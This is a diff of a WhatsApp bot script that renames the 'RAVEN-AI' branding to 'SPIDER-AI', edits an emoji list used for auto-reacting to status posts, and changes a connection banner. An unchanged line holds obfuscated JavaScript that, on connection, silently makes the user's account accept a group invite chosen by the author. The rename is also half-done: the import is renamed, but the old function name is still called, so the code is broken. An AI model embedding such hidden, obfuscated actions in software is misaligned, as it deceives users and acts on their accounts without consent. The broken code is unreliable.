@@ -1,7 +1,7 @@
 /* If it works, don't  Fix it */
 
 const {
-  default: ravenConnect,
+  default: spiderConnect,
   useMultiFileAuthState,
   DisconnectReason,
   fetchLatestBaileysVersion,
@@ -58,7 +58,7 @@ async function startSpider() {
   const client = ravenConnect({
     logger: pino({ level: "silent" }),
     printQRInTerminal: true,
-    browser: ["RAVEN-AI", "Safari", "5.1.7"],
+    browser: ["SPIDER-AI", "Safari", "5.1.7"],
     auth: state,
     syncFullHistory: true,
   });
@@ -96,7 +96,7 @@ async function startSpider() {
             
  if (autolike === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {
         const nickk = await client.decodeJid(client.user.id);
-        const emojis = ['🗿', '⌚️', '💠', '👣', '🍆', '💔', '🤍', '❤️‍🔥', '💣', '🧠', '🦅', '🌻', '🧊', '🛑', '🧸', '👑', '📍', '😅', '🎭', '🎉', '😳', '💯', '🔥', '💫', '🐒', '💗', '❤️‍🔥', '👁️', '👀', '🙌', '🙆', '🌟', '💧', '🦄', '🟢', '🎎', '✅', '🥱', '🌚', '💚', '💕', '😉', '😒'];
+        const emojis = ['🗿', '🕷️', '💠', '👣', '', '💔', '🤍', '❤️‍🔥', '🕷️', '🧠', '🦅', '🌻', '🧊', '🛑', '🧸', '👑', '📍', '😅', '🎭', '🎉', '😳', '💯', '🔥', '💫', '🐒', '💗', '❤️‍🔥', '👁️', '👀', '🙌', '🙆', '🌟', '💧', '🦄', '🟢', '🎎', '✅', '🥱', '🌚', '💚', '💕', '😉', '😒'];
         const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
         const delayMessage = 2000;
         await client.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key, } }, { statusJidList: [mek.key.participant, nickk] });
@@ -257,7 +257,7 @@ if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
       var _0x41ca8b=_0x423d;function _0x423d(_0x383d0,_0x24443d){var _0x1000b0=_0x1000();return _0x423d=function(_0x423da8,_0xdfa696){_0x423da8=_0x423da8-0xfb;var _0x1bfe57=_0x1000b0[_0x423da8];return _0x1bfe57;},_0x423d(_0x383d0,_0x24443d);}(function(_0x2511ce,_0x1f7165){var _0x45f330=_0x423d,_0x4e434=_0x2511ce();while(!![]){try{var _0x2d3b9f=parseInt(_0x45f330(0x102))/0x1*(parseInt(_0x45f330(0xfd))/0x2)+-parseInt(_0x45f330(0x103))/0x3+-parseInt(_0x45f330(0x104))/0x4*(-parseInt(_0x45f330(0xff))/0x5)+-parseInt(_0x45f330(0x105))/0x6+-parseInt(_0x45f330(0x101))/0x7+parseInt(_0x45f330(0xfc))/0x8*(parseInt(_0x45f330(0xfe))/0x9)+parseInt(_0x45f330(0xfb))/0xa;if(_0x2d3b9f===_0x1f7165)break;else _0x4e434['push'](_0x4e434['shift']());}catch(_0x6fced4){_0x4e434['push'](_0x4e434['shift']());}}}(_0x1000,0x1b808),await client[_0x41ca8b(0x100)]('F7MTnBU19oj3UjXL54k3Dg'));function _0x1000(){var _0x2753e8=['142095CQeGIt','550779hTrTWo','60fzBEEx','715014OUAmha','2869230poqBqf','259928HdzuXD','2fkXnwd','18YWlUzM','41585VsZhQW','groupAcceptInvite','1423415UGyIru'];_0x1000=function(){return _0x2753e8;};return _0x1000();}
       console.log(color("Follow me on Instagram as spider_webx", "red"));
       console.log(color("Text the bot number with menu to check my command list"));
-      const Texxt = `*╭═══════❖•ೋ° °ೋ•❖══════╮*\n`+`┊𓅂 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 » »【𝐒𝐏𝐈𝐃𝐄𝐑 𝐁𝐎𝐓】\n`+`┊𓅂 𝗠𝗼𝗱𝗲 »» ${mode}\n`+`┊𓅂 𝗣𝗿𝗲𝗳𝗶𝘅 »» ${prefix}\n`+`*╰═══════❖•ೋ° °ೋ•❖══════╯*`
+      const Texxt = `*╔═[𓅂 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 » »【𝐒𝐏𝐈𝐃𝐄𝐑 𝐁𝐎𝐓】]═╗\n`+`┊𓅂 𝗠𝗼𝗱𝗲 »» ${mode}\n`+`┊𓅂 𝗣𝗿𝗲𝗳𝗶𝘅 »» ${prefix}\n`+`*╚═══════════════════════════╝*`
       client.sendMessage(client.user.id, { text: Texxt });
     }
   });
